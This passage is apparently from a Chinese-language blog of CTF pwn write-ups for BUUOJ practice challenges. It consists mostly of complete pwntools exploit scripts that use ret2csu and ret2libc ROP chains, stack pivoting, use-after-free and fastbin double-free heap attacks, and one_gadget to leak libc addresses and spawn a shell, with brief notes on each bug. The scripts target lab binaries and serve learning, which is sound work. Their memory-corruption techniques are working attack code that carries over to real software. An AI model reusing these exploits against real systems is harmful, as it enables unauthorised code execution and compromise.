class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">26138</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vulnerable_function = <span class="number">0x4005E6</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">csu_pop = <span class="number">0x00000000004006AA</span></span><br><span class="line">csu = <span class="number">0x0000000000400690</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input:\n&quot;</span>)</span><br><span class="line"><span class="comment"># write(fd, buf, n);</span></span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">b&quot;a&quot;</span> + p64(csu_pop) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(</span><br><span class="line">    csu) + <span class="number">7</span> * p64(<span class="number">0</span>) + p64(vulnerable_function)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>, write_addr)</span><br><span class="line">offset = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = offset + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">system_addr = offset + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">b&quot;a&quot;</span> + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input:\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25051</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;size :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Content :&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;aaab&#x27;</span>)  <span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaab&#x27;</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x1b07b0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  <span class="comment">#+0x3adb0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system&#x27;</span>, <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">payload = p32(system) + <span class="string">b&#x27;;sh\x00&#x27;</span></span><br><span class="line">add(<span class="number">0x8</span>, payload)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ACTF-2019-babystack"><a href="#ACTF-2019-babystack" class="headerlink" title="ACTF_2019_babystack"></a>ACTF_2019_babystack</h3><p>由于本地libc偏移与题目环境不一致，故先进行patchelf（glibc-all-in-one:<code>./download 2.27-3ubuntu1_amd64</code>）</p><p>更换ld:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./ld-linux.so.2 ./pwn</span><br></pre></td></tr></table></figure><p>更换libc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.27.so ./pwn</span><br></pre></td></tr></table></figure><p>先<code>ldd pwn</code>，libc在本地路径<code>/lib/x86_64-linux-gnu/libc.so.6</code>，后期会用这个libc中的<code>puts</code>、<code>system</code>等找偏移</p><p>然后关键在泄露<code>puts_plt</code>的时候<code>p.sendafter(b&#39;&gt;&#39;, payload)</code>这个地方，之前写<code>p.sendlineafter(b&#39;&gt;&#39;, payload)</code>的时候，用gdb调试，会发现栈上根本没写进<code>ret</code>、<code>system</code>这个函数执行<code>ret2libc</code>，说明前面传输数据的方法存在问题，所以写<code>p.sendafter(b&#39;&gt;&#39;, payload)</code>来泄露<code>puts_plt</code></p><p><img src="H:\PWN\img\ACTF_2019_babystack1.png" alt="ACTF_2019_babystack1"></p><p><code>sendlineafter</code>在发送数据的时候会加上<code>\n</code>，而<code>sendafter</code>在发送数据的时候不会加上<code>\n</code></p><p>可以写一个简单的程序测试，<code>\n</code>会到下一次输入</p><p><img src="H:\PWN\img\ACTF_2019_babystack2.png" alt="ACTF_2019_babystack2"></p><p>然后到后面发现rsp距离数据存储的位置有一段距离，<code>distance 0x7ffd4e7cabe8(第二次printf输出s的地址，即调用printf函数时rsi寄存器中的地址) 0x7ffd4e7cadb0(第一次leak的s地址)</code>计算偏移，执行ret2libc</p><p>然后ret2libc的时候需要注意用两次ret做滑板，保持堆栈平衡</p><p>padding可以用”\x00”替代，既能当截断使用，又能做填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25043</span>)</span><br><span class="line"><span class="comment"># p= process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x0000000000400800</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400ad3</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x0000000000400a18</span></span><br><span class="line">ret = <span class="number">0x0000000000400709</span></span><br><span class="line"></span><br><span class="line">padding = <span class="built_in">str</span>(<span class="string">&quot;224&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;How many bytes of your message?\n&#x27;</span>, padding)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;at&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvline().decode().strip(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Leak address: <span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak puts_plt</span></span><br><span class="line">payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">0xD0</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">payload += p64(leak - <span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc base</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bye~\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;PUT addr: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ret2libc</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;How many bytes of your message?\n&#x27;</span>, padding)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">payload = p64(ret)*<span class="number">2</span> + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0xD0</span>, <span class="string">b&#x27;\x11&#x27;</span>)</span><br><span class="line">payload += p64(leak-<span class="number">0x190</span>-<span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="wustctf2020-easyfast"><a href="#wustctf2020-easyfast" class="headerlink" title="wustctf2020_easyfast"></a>wustctf2020_easyfast</h3><p>题目chunk前0x10字节存放：prev_size(前8字节，仅在不是 PREV_INUSE 的情况下使用)+size(后8字节)</p><p>sub_4009D7()没有检查是否已经释放, 所以可以多次释放，存在double free漏洞</p><p>可以理解成chunk1在free第二次后会指向chunk2，此时的chunk1在chunk3的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">27890</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;size&gt;&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index&gt;&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index&gt;&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602090</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)  <span class="comment">#这两个堆块的大小需要为0x50，所以申请0x40</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = p64(target - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">backdoor()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2020-YDSneedGirlfriend"><a href="#BJDCTF-2020-YDSneedGirlfriend" class="headerlink" title="[BJDCTF 2020]YDSneedGirlfriend"></a>[BJDCTF 2020]YDSneedGirlfriend</h3><p>指针前8字节是函数指针指向print_name函数，后8字节是name字符串指针</p><p>![[BJDCTF 2020]YDSneedGirlfriend](H:\PWN\img[BJDCTF 2020]YDSneedGirlfriend.png)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29891</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0000000000400B9C</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Her name size is :&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Her name is :&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;b&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h3><p>这个题很有意思的是bss和got表很接近，栈迁移的时候rsp抬栈就会覆盖got表（主要是调用puts时开辟栈帧，push大量数据到栈上，可能会覆盖掉got表），所以需要严格控制输入的大小，并且由于rsp被顶到不可写区域，故system也无法执行，只能通过one_gadget执行execve</p><p>需要注意的是满足one_gadget的条件，调试<code>x /20gx $rsp</code>栈上满足<code>[rsp+0x50] == NULL</code>，使用该ogg就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gyctf_2020_borrowstack&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./gyctf_2020_borrowstack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">main = <span class="number">0x400626</span></span><br><span class="line">bss = <span class="number">0x601080</span></span><br><span class="line">second_read_addr = <span class="number">0x400680</span></span><br><span class="line">ret_addr = <span class="number">0x04004c9</span></span><br><span class="line">leave_ret = <span class="number">0x400699</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400703</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x60</span> + p64(bss - <span class="number">0x8</span> + <span class="number">0x100</span> - <span class="number">0x40</span>) + p64(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">b&quot;Tell me what you want&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Done!You can check and use your borrow stack now!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span> - <span class="number">0x40</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:] + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libcbase = leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0xf02a4</span>  <span class="comment">#  [rsp+0x50] == NULL</span></span><br><span class="line">execve = libcbase + one_gadget</span><br><span class="line">log.info(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">bss_two = <span class="number">0x601080</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;want&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;D0g3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(execve)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="wustctf2020-number-game"><a href="#wustctf2020-number-game" class="headerlink" title="wustctf2020_number_game"></a>wustctf2020_number_game</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28389</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;-2147483648&quot;</span>) <span class="comment"># -2^31</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="hitcontraining-magicheap"><a href="#hitcontraining-magicheap" class="headerlink" title="hitcontraining_magicheap"></a>hitcontraining_magicheap</h3><p>unlink漏洞，构造unsorted bin即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span 